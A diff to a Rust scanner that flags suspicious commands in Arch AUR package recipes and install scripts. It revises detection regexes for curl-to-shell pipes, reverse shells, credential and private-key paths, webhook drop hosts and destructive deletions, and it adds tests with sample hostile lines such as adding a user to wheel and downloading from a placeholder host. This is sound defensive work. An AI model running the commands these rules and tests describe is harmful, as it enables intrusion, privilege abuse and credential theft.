@@ -54,16 +54,17 @@ struct Rule {
 
 /// Where a command can start on a line: at its beginning; after a separator;
 /// inside a command or process substitution, a subshell or a `case` arm; as
-/// the string handed to `-c`; or after a word that takes a command. Then come
+/// the string handed to `-c` or `trap`; or after a word that takes a command. Then come
 /// any `NAME=value` settings for that command and, possibly, the directory
 /// the program is in.
 ///
 /// Not after the `(` of an assignment: `makedepends=(curl)` names a package.
 /// The items of an array that spans lines are left out in `inspect`.
 const AT_COMMAND: &str = concat!(
-    r"(?:^|[;&|{`]|\$\(|<\(|(?:^|\s)\(|[\w*\x22\x27]\)\s|\s-c\s+[\x22\x27]",
-    r"|(?:^|[\s;&|(])(?:then|do|else|elif|if|while|until|exec|eval|sudo|doas|pkexec|run0|time|command|env|nice|nohup|!)\s)",
-    r"\s*(?:[A-Za-z_][A-Za-z0-9_]*=[^\s\x22\x27`$(]*\s+)*",
+    r"(?:^|[;&|{`]|\$\(|<\(|(?:^|\s)\(|[\w*\x22\x27]\)\s|\s-[a-z]*c\s+[\x22\x27]|\btrap\s+[\x22\x27]",
+    r"|(?:^|[\s;&|(])(?:then|do|else|elif|if|while|until|exec|eval|sudo|doas|pkexec|run0|time|command|env|nice|nohup|!",
+    r"|timeout\s+(?:-\S+\s+)*\S+|xargs(?:\s+(?:-\S+|[0-9]+|\{\}))*)\s)",
+    r"\s*(?:[A-Za-z_][A-Za-z0-9_]*=(?:[^\s\x22\x27`$(]|\x22[^\x22`$]*\x22|\x27[^\x27]*\x27)*\s+)*",
     r"(?:/(?:usr/)?(?:local/)?s?bin/)?",
 );
 
@@ -127,12 +128,12 @@ static RULES: LazyLock<Vec<Rule>> = LazyLock::new(|| {
     use Scope::{All, Helper, InstallScript, Recipe, Scripts};
     use Severity::{Block, Info, Review};
     vec![
-        rule("REMOTE-SHELL", Block, "Downloads are piped into a shell without a separately reviewed source.", &format!(r"\b(?:curl|wget)\b[^\n]*\|\s*{SHELL}|\b(?:(?:ba|z|da|k)?sh|source|eval|\.)\s+(?:-[A-Za-z]+\s+)*[\x22\x27]?(?:<|\$)\(\s*(?:curl|wget)\b")),
+        rule("REMOTE-SHELL", Block, "Downloads are piped into a shell without a separately reviewed source.", &format!(r"\b(?:curl|wget)\b[^\n]*\|\s*{SHELL}|(?:\b(?:(?:ba|z|da|k)?sh|source|eval)|(?:^|[\s;&|])\.)\s+(?:-[A-Za-z]+\s+)*[\x22\x27]?(?:<|\$)\(\s*(?:curl|wget)\b")),
         rule("ENCODED-SHELL", Block, "Decoded content is piped into a shell.", &format!(r"\b(?:base64|base32|xxd|openssl|gunzip|zcat|xzcat|bzcat|zstdcat|rev)\b[^\n]*\|\s*{SHELL}|\b(?:gzip|xz|bzip2|zstd)\s+(?:-[A-Za-z]*\s+)*-[A-Za-z]*d[^\n]*\|\s*{SHELL}")),
         rule("KNOWN-PAYLOAD", Block, "A package name used in known AUR malware campaigns is installed.", r"\b(?:npm|bun|pnpm|yarn)\s+(?:install|add)\s+(?:atomic-lockfile|js-digest)\b"),
         rule("PRIVATE-KEY", Block, "The recipe refers to private authentication material. Review why it needs access.", r"(?:~|\$HOME|\$\{HOME\})/\.(?:ssh/id_[A-Za-z0-9_]+|aws/credentials|gnupg/private-keys-v1\.d)"),
         rule("REVERSE-SHELL", Block, "A shell is connected to a network socket.", r"\b(?:ba|z)?sh\s+-i\b[^\n]*/dev/(?:tcp|udp)/|\b(?:nc|ncat|netcat)\b[^\n]*\s(?:-[A-Za-z]*e\b|--(?:sh-)?exec\b|-[A-Za-z]*c\s+[\x22\x27]?(?:/[\w./-]*/)?(?:ba|z|da|k)?sh\b)|\bsocat\b[^\n]*\b(?i:exec|system):"),
-        rule("PIPED-SHELL", Review, "The output of a command is piped into a shell: what runs is not written in the recipe.", &format!(r"\|\s*{SHELL}")).scope(Scripts),
+        rule("PIPED-SHELL", Review, "The output of a command is piped into a shell: what runs is not written in the recipe.", &format!(r"(?:\s\|\s*|\|\s+){SHELL}(?:[\s;&)]|$)")).scope(Scripts),
         rule("DYNAMIC-EVAL", Review, "Dynamic shell evaluation obscures the commands that execute.", r"\beval\s+").scope(Scripts),
         rule("PRIVILEGE", Review, "The recipe invokes a privilege-changing tool.", &format!(r"{AT_COMMAND}(?:(?:sudo|doas|pkexec|run0)\s+|su\s+(?:[A-Za-z_][\w-]*\s+)?-)")).scope(Scripts).command(),
         // Checksums written as array items are judged one by one in
@@ -149,16 +150,16 @@ static RULES: LazyLock<Vec<Rule>> = LazyLock::new(|| {
         rule("CREDENTIAL-STORE", Review, "The recipe refers to where browsers, password managers or developer tools keep credentials.", r"(?:~|\$HOME|\$\{HOME\}|/home/[^/\s]+)/\.(?:mozilla|config/(?:google-chrome|chromium|BraveSoftware|Bitwarden)|local/share/keyrings|password-store|netrc|git-credentials|kube/config|docker/config\.json|config/gh/hosts\.yml)\b|\bwallet\.dat\b").commands_only(),
         rule("DROP-HOST", Review, "The recipe refers to a paste, file-drop, webhook or tunnel service: places code is fetched from, or data is sent to, without a trace.", &format!(r"(?i)discord(?:app)?\.com/api/webhooks/|api\.telegram\.org/bot|hooks\.slack\.com/services/|://(?:[a-z0-9-]+\.)*{DROP_HOSTS}\b|(?:^|[\s\x22\x27=(@]){DROP_HOSTS}(?:/|:[0-9])|\b[a-z0-9-]+\.ngrok(?:-free)?\.(?:io|app|dev)\b")),
         rule("NUMERIC-HOST", Review, "A URL points at a numeric address instead of a named host.", r"\bhttps?://(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b").unless(r"://(?:127\.|0\.0\.0\.0|10\.|192\.168\.|169\.254\.|172\.(?:1[6-9]|2[0-9]|3[01])\.)"),
-        rule("PACKAGE-MANAGER", Review, "The recipe runs a package manager itself.", &format!(r"{AT_COMMAND}(?:pacman|yay|paru|pamac|pikaur)\s+(?:-[A-Za-z-]+\s+)*-[A-Za-z]*[SUR][A-Za-z]*")).command().unless(r"\s-S[a-z]*[silgp][a-z]*$"),
-        rule("PACKAGE-TRUST", Review, "The recipe changes which packages or keys pacman trusts.", r"\bpacman-key\s+[^\n]*(?:--add|--lsign-key|--lsign\b|--recv-keys|--populate|--import|\s-[a-z]*[ar]\b)|/etc/pacman\.conf\b|/etc/pacman\.d/|\bSigLevel\b").scope(Scripts).commands_only(),
-        rule("ACCOUNT", Review, "An account is given administrative rights, the identity of root, or a new password.", r"\b(?:usermod|gpasswd|useradd|adduser)\b[^\n]*\b(?:wheel|sudo|root|adm|docker)\b|\buseradd\b[^\n]*(?:\s-[A-Za-z]*o\b|\s-u\s*0\b|--uid[=\s]0\b|--non-unique\b)|\bchpasswd\b|(?:^|[;&|]\s*|\s)passwd\s").scope(Scripts).commands_only(),
+        rule("PACKAGE-MANAGER", Review, "The recipe runs a package manager itself.", &format!(r"{AT_COMMAND}(?:pacman|yay|paru|pamac|pikaur)\s+(?:-[A-Za-z-]+\s+)*-[A-Za-z]*[SUR][A-Za-z]*")).scope(Scripts).command().unless(r"\s-S[silgpq]+$"),
+        rule("PACKAGE-TRUST", Review, "The recipe changes which packages or keys pacman trusts.", r"\bpacman-key\s+[^\n]*(?:--add|--lsign-key|--lsign\b|--recv-keys|--populate|--import|\s-[a-z]*[ar]\b)|(?:\$\{?pkgdir\}?[\x22\x27]?)?/etc/pacman\.(?:conf\b|d/)|\bSigLevel\b").scope(Scripts).commands_only().unless(r"^\$\{?pkgdir"),
+        rule("ACCOUNT", Review, "An account is given administrative rights, the identity of root, or a new password.", &format!(r"\b(?:usermod|gpasswd|useradd|adduser)\b[^\n]*\b(?:wheel|sudo|root|adm|docker)\b|\buseradd\b[^\n]*(?:\s-[A-Za-z]*o\b|\s-u\s*0\b|--uid[=\s]0\b|--non-unique\b)|\bchpasswd\b|{AT_COMMAND}passwd\s")).scope(Scripts).commands_only(),
         rule("DISABLE-PROTECTION", Review, "A system protection is switched off.", r"\bsetenforce\s+0\b|\bufw\s+disable\b|\biptables\s+(?:-F|--flush)\b|\bnft\s+flush\s+ruleset\b|\bsystemctl\s+(?:--[a-z-]+\s+)*(?:stop|disable|mask)\s+[^\n]*\b(?:firewalld|ufw|apparmor|auditd|nftables|iptables)\b|\bkernel\.(?:randomize_va_space|kptr_restrict|yama\.ptrace_scope)\s*=\s*0\b").commands_only(),
-        rule("DESTRUCTIVE", Review, "Files are deleted from the filesystem root or a home directory.", &format!(r"{AT_COMMAND}rm\s+(?:-[A-Za-z-]+\s+)+(?:[^\s;&|]+\s+)*[\x22\x27]?(?:/(?:etc|usr|var|boot|home|root|opt|bin|sbin|lib|lib64|srv)?|~|\$HOME|\$\{{HOME\}})/?\*?[\x22\x27]?(?:\s|;|&|$)|{AT_COMMAND}dd\s[^\n]*\bof=/dev/(?:sd|nvme|vd|hd|mmcblk|mapper/)|{AT_COMMAND}(?:mkfs(?:\.[a-z0-9]+)?|wipefs|shred)\s")).command(),
+        rule("DESTRUCTIVE", Review, "Files are deleted from the filesystem root or a home directory.", &format!(r"{AT_COMMAND}rm\s+(?:-[A-Za-z-]+\s+)+(?:[^\s;&|]+\s+)*[\x22\x27]?(?:/(?:etc|usr|var|boot|home|root|opt|bin|sbin|lib|lib64|srv)?|~|\$HOME|\$\{{HOME\}})/?\*?[\x22\x27]?(?:\s|;|&|$)|{AT_COMMAND}dd\s[^\n]*\bof=/dev/(?:sd|nvme|vd|hd|mmcblk|mapper/)|{AT_COMMAND}(?:mkfs(?:\.[a-z0-9]+)?|wipefs|shred)\s")).scope(Scripts).command(),
         rule("BUILD-DOWNLOAD", Review, "The build downloads something itself, outside the declared sources and their checksums.", &format!(r"{AT_COMMAND}(?:(?:curl|wget|aria2c)\s|git\s+clone\s[^\n]*(?:https?|git|ssh)://|(?:python[0-9.]*|perl|ruby|node|php)\s+(?:-[A-Za-z]+\s+)*-[ce]\s[^\n]*(?:https?://|urlopen|urlretrieve))")).scope(Recipe).command(),
         rule("OUTSIDE-WRITE", Review, "The build writes to the system instead of into the package directory.", r"(?:>>?|\btee\s+(?:-a\s+)?)\s*[\x22\x27]?/(?:etc|usr|opt|var|bin|sbin|lib|lib64|boot|root|home)/").scope(Recipe).commands_only(),
         rule("INSTALL-DOWNLOAD", Review, "The install script, which runs as root, fetches or installs software itself.", &format!(r"{AT_COMMAND}(?:curl|wget|aria2c|git\s+clone|pip3?\s+install|npm\s+(?:i|install|ci)|pnpm\s+(?:i|install|add)|yarn\s+(?:install|add)|gem\s+install|cargo\s+install|go\s+install)\b|{AT_COMMAND}(?:python[0-9.]*|perl|ruby|node|php)\s+(?:-[A-Za-z]+\s+)*-[ce]\s[^\n]*(?:https?://|urlopen|urlretrieve)")).scope(InstallScript).command(),
         rule("SCRIPT-DOWNLOAD", Review, "A script that comes with the recipe downloads something when it runs.", &format!(r"{AT_COMMAND}(?:curl|wget|aria2c)\s")).scope(Helper).command(),
-        rule("INSTALL-WRITE", Review, "The install script, which runs as root, writes system configuration itself instead of shipping it as a file of the package.", r"(?:(?:^|[^-=<>])>>?|\btee\s+(?:-a\s+)?)\s*[\x22\x27]?(?:/(?:etc|usr|root|boot|var/spool/cron)/|\$[{A-Za-z_])|\bsed\s[^\n]*-i[^\n]*\s[\x22\x27]?/(?:etc|usr|root|boot)/|\b(?:cp|mv|ln|install)\s[^\n]*\s[\x22\x27]?/(?:etc/(?:profile|udev/rules\.d|cron|ld\.so|ssh|environment|modprobe\.d|modules-load\.d)|usr/share/libalpm/hooks|root/\.ssh)|\b(?:cp|mv|install)\s[^\n]*\s[\x22\x27]?/etc/systemd/system/|\bauthorized_keys\b|\bsshd_config\b").scope(InstallScript).commands_only(),
+        rule("INSTALL-WRITE", Review, "The install script, which runs as root, writes system configuration itself instead of shipping it as a file of the package.", r"(?:(?:^|[^-=<>])>>?|\btee\s+(?:-a\s+)?)\s*[\x22\x27]?/(?:etc|usr|root|boot|var/spool/cron)/|(?:(?:^|[^-=<>0-9])>>?|\btee\s+(?:-a\s+)?)\s*[\x22\x27]?\$[{A-Za-z_]|\bsed\s[^\n]*-i[^\n]*\s[\x22\x27]?/(?:etc|usr|root|boot)/|\b(?:cp|mv|ln|install)\s[^\n]*\s[\x22\x27]?/(?:etc/(?:profile|udev/rules\.d|cron|ld\.so|ssh|environment|modprobe\.d|modules-load\.d)|usr/share/libalpm/hooks|root/\.ssh)|\b(?:cp|mv|install)\s[^\n]*\s[\x22\x27]?/etc/systemd/system/|\bauthorized_keys\b|\bsshd_config\b").scope(InstallScript).commands_only(),
         rule("INSTALL-SERVICE", Info, "The install script starts, stops or enables a service.", &format!(r"{AT_COMMAND}(?:systemctl\s+(?:--[a-z-]+\s+)*(?:enable|start|restart|disable|stop|mask)\b|ln\s[^\n]*/etc/systemd/[^\s]*\.wants/)")).scope(InstallScript).command(),
         rule("PRELOAD", Info, "A library is preloaded into a program (LD_PRELOAD).", r"\bLD_PRELOAD="),
     ]
@@ -220,14 +221,17 @@ fn sandbox_helper(line: &str) -> bool {
 /// never guesses: a substitution, a `$'…'` string, an expansion with quoting
 /// inside it, or a line joined to the next one makes the line an ordinary line
 /// that every rule inspects.
-fn message_lines(text: &str) -> Vec<bool> {
-    const PRINTERS: [&str; 8] = [
-        "echo", "printf", "msg", "msg2", "warning", "error", "plain", "note",
-    ];
+fn message_lines(text: &str, lines: &Lines) -> Vec<bool> {
     let mut flags = Vec::new();
     // The quote a message left open at the end of the previous line.
     let mut carried: Option<char> = None;
-    for line in text.lines() {
+    for (index, line) in text.lines().enumerate() {
+        // The body of a here-document that `cat` prints.
+        if lines.printed.get(index).copied().unwrap_or(false) {
+            flags.push(true);
+            carried = None;
+            continue;
+        }
         let quote = match carried.take() {
             Some(quote) => Some(quote),
             None => {
@@ -239,17 +243,52 @@ fn message_lines(text: &str) -> Vec<bool> {
                 None
             }
         };
-        let (plain, open) = printed(line, quote);
+        let (plain, open) = printed(line, quote, false);
         flags.push(plain);
         carried = if plain { open } else { None };
     }
     flags
 }
 
+/// The commands that print their arguments: the shell's, and makepkg's.
+const PRINTERS: [&str; 7] = ["echo", "printf", "msg", "msg2", "warning", "error", "plain"];
+
+/// Whether a file gives one of the printing commands another meaning
+/// (`msg() { "$@"; }`). After that, a line that starts with it is not known
+/// to print anything.
+fn redefines_a_printer(text: &str) -> bool {
+    static REDEFINED: LazyLock<Regex> = LazyLock::new(|| {
+        let names = PRINTERS.join("|");
+        Regex::new(&format!(
+            r"(?m)(?:^|[\s;&|{{(])(?:(?:function\s+)?(?:{names})\s*\(\s*\)|function\s+(?:{names})\b|alias\s+(?:-\S+\s+)*[\x22\x27]?(?:{names})=)"
+        ))
+        .expect("built-in pattern must compile")
+    });
+    REDEFINED.is_match(text)
+}
+
+/// Whether a line does nothing but give a variable one word of text:
+/// `pkgdesc="Download tool (wget replacement)"`. Nothing on it runs.
+fn assigns_text(line: &str) -> bool {
+    let rest = line.trim_start();
+    let name = rest
+        .bytes()
+        .take_while(|b| b.is_ascii_alphanumeric() || *b == b'_')
+        .count();
+    if name == 0 || rest.as_bytes()[0].is_ascii_digit() {
+        return false;
+    }
+    match rest[name..].strip_prefix('=') {
+        Some(value) => printed(value, None, true) == (true, None),
+        None => false,
+    }
+}
+
 /// Reads one line of a printing command, starting inside `quote` if a string
 /// was left open. Returns whether the line is only text, and the quote that
-/// is open at its end.
-fn printed(line: &str, mut quote: Option<char>) -> (bool, Option<char>) {
+/// is open at its end. With `one_word`, the text has to be a single word, as
+/// the value of an assignment is: a second word would be a command.
+fn printed(line: &str, mut quote: Option<char>, one_word: bool) -> (bool, Option<char>) {
     const NO: (bool, Option<char>) = (false, None);
     let chars: Vec<char> = line.chars().collect();
     let mut k = 0;
@@ -282,6 +321,13 @@ fn printed(line: &str, mut quote: Option<char>) -> (bool, Option<char>) {
                     quote = Some(c);
                     k += 1;
                 }
+                // A word that starts with `#` starts a comment: the line ends here.
+                '#' if k == 0 || chars[k - 1].is_whitespace() => return (true, None),
+                c if one_word && c.is_whitespace() => {
+                    let rest: String = chars[k..].iter().collect();
+                    let rest = rest.trim_start();
+                    return (rest.is_empty() || rest.starts_with('#'), None);
+                }
                 // A backslash at the end joins the next line to this command.
                 '\\' if next.is_none() => return NO,
                 '\\' => k += 2,
@@ -304,14 +350,20 @@ fn printed(line: &str, mut quote: Option<char>) -> (bool, Option<char>) {
 /// alternatives. Anything it cannot read as a list of words ends that array;
 /// what it returns was written literally.
 ///
-/// Also returns the lines that do nothing but continue an array: the items
-/// of `makedepends=(` on the lines after it are names, not commands.
+/// Also returns the lines that are nothing but an array or part of one: the
+/// items of `makedepends=(…)`, on its line or the lines after it, are names
+/// and not commands.
 fn arrays(text: &str) -> (Arrays, Vec<usize>) {
     let mut out: Arrays = Vec::new();
     let mut continued = Vec::new();
     let mut open: Option<usize> = None;
+    let heredoc = line_kinds(text).heredoc;
     for (index, line) in text.lines().enumerate() {
-        let continuation = open.is_some();
+        // The body of a here-document is text, whatever it looks like.
+        if heredoc.get(index).copied().unwrap_or(false) {
+            open = None;
+            continue;
+        }
         let mut rest = line;
         if open.is_none() {
             let trimmed = line.trim_start();
@@ -386,8 +438,7 @@ fn arrays(text: &str) -> (Arrays, Vec<usize>) {
         }
         // Only names: nothing that could start a command, and nothing but a
         // comment after the array closes.
-        if continuation
-            && quote.is_none()
+        if quote.is_none()
             && (tail.is_empty() || tail.starts_with('#'))
             && !line.contains([';', '|', '&', '`', '<'])
             && !line.contains("$(")
@@ -624,14 +675,29 @@ fn verified_sources(text: &str) -> Vec<usize> {
 /// comment-looking lines are inspected like any other line. The cost of not
 /// knowing is a finding in a comment, never a skipped command.
 fn comment_lines(text: &str) -> Vec<bool> {
-    line_kinds(text).0
+    line_kinds(text).comments
 }
 
-/// `comment_lines`, and for each line whether it is the body of a
-/// here-document that `cat` or `tee` writes out: the content of a file the
-/// recipe generates, not commands of the recipe. A here-document handed to
-/// anything else, or piped on, may be run and is not marked.
-fn line_kinds(text: &str) -> (Vec<bool>, Vec<bool>) {
+/// What each line of a file is, as far as the shell's quoting says.
+struct Lines {
+    /// Certainly a shell comment. See `comment_lines`.
+    comments: Vec<bool>,
+    /// The body of a here-document.
+    heredoc: Vec<bool>,
+    /// The body of a here-document that `cat` or `tee` writes to a file: the
+    /// content of a file the recipe generates, not commands of the recipe.
+    generated: Vec<bool>,
+    /// The body of a here-document that `cat` prints, and that runs nothing
+    /// while it is printed.
+    printed: Vec<bool>,
+    /// How many lines were read before something this does not model was
+    /// met. What it says about later lines is not relied on.
+    trusted: usize,
+}
+
+/// A here-document handed to anything but `cat` or `tee`, or piped on, may be
+/// run: its body is marked neither as written out nor as printed.
+fn line_kinds(text: &str) -> Lines {
     #[derive(Clone, Copy, PartialEq)]
     enum State {
         Command,
@@ -643,7 +709,10 @@ fn line_kinds(text: &str) -> (Vec<bool>, Vec<bool>) {
     let is_blank = |c: char| c == ' ' || c == '\t';
     let mut flags = Vec::new();
     let mut generated = Vec::new();
-    let mut writes_file = false;
+    let mut printed = Vec::new();
+    let mut bodies = Vec::new();
+    let mut trusted_lines = None;
+    let (mut writes_file, mut prints) = (false, false);
     let mut state = State::Command;
     let mut trusted = true;
     let mut joined = false;
@@ -652,9 +721,14 @@ fn line_kinds(text: &str) -> (Vec<bool>, Vec<bool>) {
     let mut heredoc: Option<(Vec<char>, bool)> = None;
     for raw in text.split('\n') {
         let line: Vec<char> = raw.chars().collect();
+        if !trusted && trusted_lines.is_none() {
+            trusted_lines = Some(flags.len());
+        }
         if let Some((marker, strip_tabs)) = &heredoc {
             flags.push(false);
+            bodies.push(true);
             generated.push(trusted && writes_file);
+            printed.push(trusted && prints && !raw.contains("$(") && !raw.contains('`'));
             let body = if *strip_tabs {
                 let tabs = line.iter().take_while(|c| **c == '\t').count();
                 &line[tabs..]
@@ -674,6 +748,8 @@ fn line_kinds(text: &str) -> (Vec<bool>, Vec<bool>) {
         }
         flags.push(trusted && hash_first && state == State::Command && !joined);
         generated.push(false);
+        printed.push(false);
+        bodies.push(false);
         joined = false;
         let mut pending: Option<(Vec<char>, bool)> = None;
         let mut k = 0;
@@ -798,15 +874,27 @@ fn line_kinds(text: &str) -> (Vec<bool>, Vec<bool>) {
         }
         if let Some(found) = pending {
             if state == State::Command && !joined {
-                writes_file = matches!(raw.split_whitespace().next(), Some("cat" | "tee"))
-                    && !raw.contains('|');
+                let first = raw.split_whitespace().next();
+                writes_file = matches!(first, Some("cat" | "tee")) && !raw.contains('|');
+                // `cat <<EOF`, to the terminal: nothing is written or piped.
+                prints = first == Some("cat")
+                    && !raw
+                        .replace("1>&2", "")
+                        .replace(">&2", "")
+                        .contains(['|', '>', ';', '&']);
                 heredoc = Some(found);
             } else {
                 trusted = false;
             }
         }
     }
-    (flags, generated)
+    Lines {
+        trusted: trusted_lines.unwrap_or(flags.len()),
+        comments: flags,
+        heredoc: bodies,
+        generated,
+        printed,
+    }
 }
 
 /// `${…}` starting after the brace at `i`: where it ends, if it is plain
@@ -987,6 +1075,20 @@ pub(crate) fn opaque(snapshot: &Snapshot, baseline: Option<&Snapshot>) -> Vec<Fi
                     ))
                 }
                 Some(_) => {}
+                // Not readable, and the line names such a file itself.
+                None if recipe.text.lines().nth(line - 1).is_some_and(|text| {
+                    opaque_files
+                        .iter()
+                        .any(|path| text.contains(path.rsplit('/').next().unwrap_or(path)))
+                }) =>
+                {
+                    findings.push(finding(
+                        "OPAQUE-RUN",
+                        Severity::Block,
+                        "The install script pacman runs as root is set to a file whose content could not be inspected.".into(),
+                        evidence,
+                    ))
+                }
                 None => findings.push(finding(
                     "OPAQUE-RUN",
                     Severity::Review,
@@ -1029,6 +1131,10 @@ pub(crate) fn opaque(snapshot: &Snapshot, baseline: Option<&Snapshot>) -> Vec<Fi
             r"(?:\b(?:bash|sh|zsh|dash|source|eval|exec|python[0-9.]*|perl|ruby|node|lua|php|xargs|env)\s[^\n]*|(?:^|[;&|])\s*\.\s+[^\n]*|\./|chmod\s+[^\n]*\+x[^\n]*){quoted}"
         ))
         .expect("escaped name");
+        let placed = Regex::new(&format!(
+            r"\b(?:install|cp|mv|ln)\b[^\n]*(?:{quoted}[^\n]*(?:/s?bin/|/profile\.d/|/libalpm/|/systemd/|/udev/|/autostart/|/cron|/pacman\.d/|/modules-load\.d/|/modprobe\.d/|/sudoers|/polkit-1/|\.(?:sh|bash|zsh|py|pl|install|hook|service|timer|rules|desktop|conf)\b)|-[A-Za-z]*m\s*[0-7]?[1357][0-7]{{2}}\b[^\n]*{quoted})"
+        ))
+        .expect("escaped name");
         for script in snapshot
             .files
             .iter()
@@ -1047,9 +1153,15 @@ pub(crate) fn opaque(snapshot: &Snapshot, baseline: Option<&Snapshot>) -> Vec<Fi
                         m,
                     ))
                 } else {
-                    run.find(line).map(|m| {
-                        ("OPAQUE-RUN", Severity::Review, "A file whose content could not be inspected is run or handed to an interpreter.", m)
-                    })
+                    run.find(line)
+                        .map(|m| {
+                            ("OPAQUE-RUN", Severity::Review, "A file whose content could not be inspected is run or handed to an interpreter.", m)
+                        })
+                        .or_else(|| {
+                            placed.find(line).map(|m| {
+                                ("OPAQUE-RUN", Severity::Review, "A file whose content could not be inspected is installed as a program, or where the system reads scripts and settings.", m)
+                            })
+                        })
                 };
                 if let Some((id, severity, message, matched)) = hit {
                     findings.push(finding(
@@ -1077,6 +1189,10 @@ pub(crate) fn opaque(snapshot: &Snapshot, baseline: Option<&Snapshot>) -> Vec<Fi
 fn install_scripts(text: &str) -> Vec<(usize, Option<String>)> {
     static INSTALL: LazyLock<Regex> = LazyLock::new(|| {
         Regex::new(r"(?:^|[\s;{])install\+?=([^\s;]*)").expect("built-in pattern must compile")
+    });
+    static INDIRECT: LazyLock<Regex> = LazyLock::new(|| {
+        Regex::new(r"\bprintf\s+-v\s+install\b|\b(?:read|mapfile|readarray)\s+(?:-\S+\s+)*install\b|\$\{install:?=")
+            .expect("built-in pattern must compile")
     });
     static VARIABLE: LazyLock<Regex> = LazyLock::new(|| {
         Regex::new(r"\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)")
@@ -1107,6 +1223,10 @@ fn install_scripts(text: &str) -> Vec<(usize, Option<String>)> {
             continue;
         }
         let Some(value) = INSTALL.captures(line).and_then(|c| c.get(1)) else {
+            // The variable set some other way: not read, and not ignored.
+            if INDIRECT.is_match(line) {
+                found.push((index + 1, None));
+            }
             continue;
         };
         let mut name = unquote(value.as_str());
@@ -1149,9 +1269,20 @@ pub(crate) fn inspect(snapshot: &Snapshot) -> Vec<Finding> {
         .iter()
         .map(|file| file.path.as_str())
         .collect();
+    // A checkout that gives a printing command another meaning has no lines
+    // that are known to only print.
+    let redefined = snapshot
+        .files
+        .iter()
+        .any(|file| redefines_a_printer(&file.text));
     for file in snapshot.files.iter().filter(|file| !file.opaque) {
-        let (comments, generated) = line_kinds(&file.text);
-        let messages = message_lines(&file.text);
+        let lines = line_kinds(&file.text);
+        let (comments, generated) = (&lines.comments, &lines.generated);
+        let messages = if redefined {
+            Vec::new()
+        } else {
+            message_lines(&file.text, &lines)
+        };
         let is_recipe = file.path == "PKGBUILD";
         let is_install_script = file.path.ends_with(".install");
         let is_script = is_script(file);
@@ -1170,7 +1301,10 @@ pub(crate) fn inspect(snapshot: &Snapshot) -> Vec<Finding> {
         for (index, line) in file.text.lines().enumerate() {
             let is_comment = comments.get(index).copied().unwrap_or(false);
             let is_message = messages.get(index).copied().unwrap_or(false);
-            let is_name = names.contains(&(index + 1));
+            // A name in a list or a word of text given to a variable. A list
+            // is only known to be one while the quoting before it was followed.
+            let is_name =
+                (names.contains(&(index + 1)) && index < lines.trusted) || assigns_text(line);
             let line_start = findings.len();
             for rule in RULES.iter() {
                 if !rule.inspect_comments && is_comment {
@@ -1228,11 +1362,26 @@ pub(crate) fn inspect(snapshot: &Snapshot) -> Vec<Finding> {
                         .is_some_and(|skip| skip.is_match(m.as_str()))
                 });
                 if let Some(matched) = found {
+                    // Advice that is printed ("to install, run: curl … | sh")
+                    // is not that command being run. It still needs a person:
+                    // the text may be meant for a shell further on.
+                    let advice = rule.severity == Severity::Block && is_message;
                     findings.push(Finding {
                         rule_id: rule.id.into(),
                         source: "deterministic".into(),
-                        severity: rule.severity,
-                        message: rule.message.into(),
+                        severity: if advice {
+                            Severity::Review
+                        } else {
+                            rule.severity
+                        },
+                        message: if advice {
+                            format!(
+                                "Printed text contains a command that is blocked when it runs. {}",
+                                rule.message
+                            )
+                        } else {
+                            rule.message.into()
+                        },
                         evidence: vec![Evidence {
                             path: file.path.clone(),
                             line: index + 1,
@@ -1847,6 +1996,8 @@ mod tests {
             "_i=icon.png\ninstall=$_i\n",
             "_n=icon\npackage_a() {\n  install=\"${_n}.png\"\n}\n",
             "package_a() { install=icon.png; }\n",
+            "printf -v install %s icon.png\n",
+            "read -r install <<< icon.png\n",
         ] {
             assert_eq!(
                 found(recipe),
@@ -1870,6 +2021,7 @@ mod tests {
             "_i=a\n_i=b\ninstall=$_i\n",
             "pkgname=(a b)\ninstall=${pkgname[0]}.install\n",
             "install=$unset.install\n",
+            "_f=icon\nprintf -v install %s.install \"$_g\"\n",
         ] {
             assert_eq!(
                 found(recipe),
@@ -1967,10 +2119,27 @@ mod tests {
         // Copying it into the package is what an icon is for.
         for line in [
             "install -Dm644 assets/icon.png \"$pkgdir/usr/share/pixmaps/app.png\"",
+            "install -Dm644 icon.png \"$pkgdir/usr/share/icons/hicolor/128x128/apps/app.png\"",
             "cp assets/icon.png \"$pkgdir/usr/share/app/\"",
             "# bash assets/icon.png",
         ] {
             assert!(run(line).is_empty(), "{line}");
+        }
+        // Put where it would be run, or read as a script or as settings, it
+        // is not being used as an icon.
+        for line in [
+            "install -Dm644 icon.png \"$pkgdir/etc/profile.d/probe.sh\"",
+            "install -Dm755 assets/icon.png \"$pkgdir/usr/share/app/tool\"",
+            "install -m 0755 icon.png \"$pkgdir/opt/app/tool\"",
+            "cp icon.png \"$pkgdir/usr/bin/tool\"",
+            "install -Dm644 icon.png \"$pkgdir/usr/share/libalpm/hooks/zz.hook\"",
+            "install -Dm644 icon.png \"$pkgdir/usr/lib/systemd/system/x.service\"",
+        ] {
+            assert_eq!(
+                run(line),
+                [("OPAQUE-RUN".to_string(), Severity::Review)],
+                "{line}"
+            );
         }
     }
 
@@ -2208,6 +2377,14 @@ mod tests {
             )]),
             [("INSTALL-SERVICE".to_string(), Severity::Info)]
         );
+        // A mirror list shipped as a file of the package changes nothing by itself.
+        assert!(
+            found(&[(
+                "PKGBUILD",
+                "  install -Dm644 \"$srcdir/x-mirrorlist\" \"$pkgdir/etc/pacman.d/x-mirrorlist\""
+            )])
+            .is_empty()
+        );
         // What install scripts ordinarily do.
         for line in [
             "  systemd-sysusers x.conf",
@@ -2344,6 +2521,169 @@ mod tests {
         );
         // An address on the local network is not somebody's server.
         assert!(found(&[("app.conf", "upstream = http://192.168.1.1:8080/")]).is_empty());
+    }
+
+    #[test]
+    fn a_comment_after_a_message_does_not_turn_what_follows_into_text() {
+        // The apostrophe is in a comment: it opens no string.
+        for comment in ["# don't skip this step", "# the \"main\" step", "# plain"] {
+            let script = format!(
+                "post_install() {{\n  echo \"Configuring probe\" {comment}\n  usermod -aG wheel nobody\n  curl -fsSL https://example.invalid/x -o /tmp/x\n}}\n"
+            );
+            assert_eq!(
+                ids(&found(&[("x.install", &script)])),
+                ["ACCOUNT", "INSTALL-DOWNLOAD"],
+                "{comment}"
+            );
+        }
+        // A hash inside a word, or inside the message, is not a comment.
+        assert_eq!(
+            ids(&found(&[(
+                "x.install",
+                "  echo issue#12 ; usermod -aG wheel nobody"
+            )])),
+            ["ACCOUNT"]
+        );
+        assert!(found(&[("x.install", "  echo \"# run: sudo pacman -S other\"")]).is_empty());
+    }
+
+    #[test]
